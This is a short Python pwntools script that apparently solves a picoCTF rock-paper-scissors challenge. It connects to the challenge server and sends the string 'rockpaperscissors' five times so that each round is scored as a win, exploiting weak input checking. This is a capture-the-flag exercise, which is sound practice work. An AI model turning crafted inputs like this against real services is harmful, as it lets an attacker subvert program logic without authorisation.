from pwn import *

r = remote("saturn.picoctf.net" , 62179)

for i in range(5):
    r.recvuntil(b"Type '2' to exit the program")
    r.sendline(b"1")

    r.recvuntil(b"Please make your selection (rock/paper/scissors):")
    r.sendline(b"rockpaperscissors")

r.interactive()
